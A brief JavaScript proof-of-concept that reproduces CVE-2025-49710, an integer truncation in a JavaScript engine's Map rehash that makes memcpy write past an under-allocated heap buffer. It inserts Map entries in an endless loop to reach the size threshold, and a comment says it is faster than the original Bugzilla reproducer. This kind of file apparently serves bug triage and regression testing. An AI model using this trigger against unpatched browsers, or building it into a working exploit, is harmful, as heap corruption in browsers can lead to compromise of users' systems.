// CVE-2025-49710 / Bug 1970095 — OrderedHashTableObject Rehash size_t→uint32_t
// truncation in AllocNurseryOrMallocBuffer; subsequent memcpy writes past the
// under-allocated buffer.
//
// Original Bugzilla PoC (attachment 9492361) used a cascading
// for-of+mutate pattern that took ~6 minutes to grow the Map past the
// uint32_t allocation threshold. This direct insert variant triggers the
// same bug ~3x faster (~2 minutes) by skipping the iteration overhead.
let m = new Map();
let i = 0;
try {
    while (true) {
        m.set(i, 0);
        i++;
    }
} catch (e) {}
